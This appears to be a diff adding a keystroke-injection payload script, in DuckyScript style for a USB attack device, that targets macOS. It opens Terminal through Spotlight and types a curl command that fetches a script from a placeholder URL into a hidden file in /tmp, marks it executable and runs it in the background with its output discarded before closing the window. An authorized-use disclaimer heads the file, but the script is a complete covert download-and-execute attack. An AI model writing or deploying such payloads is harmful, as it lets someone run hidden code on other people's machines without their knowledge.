@@ -1,0 +1,20 @@
+REM ============================================================
+REM macOS: Spotlight -> Terminal, download and execute a script
+REM AUTHORIZED USE ONLY - run only on systems you own or have
+REM explicit written permission to test.
+REM EDIT THE URL BELOW before running.
+REM ============================================================
+DELAY 1500
+GUI SPACE
+DELAY 600
+STRING terminal
+DELAY 400
+ENTER
+DELAY 1500
+STRINGLN curl -sL http://example.com/your-tool.sh -o /tmp/.svc.sh && chmod +x /tmp/.svc.sh && nohup /tmp/.svc.sh >/dev/null 2>&1 &
+DELAY 600
+STRINGLN exit
+DELAY 400
+LED_BLINK 3 #00FF00
+SCREEN_TEXT payload delivered #00FF00
+LOG mac_download_run: payload delivered
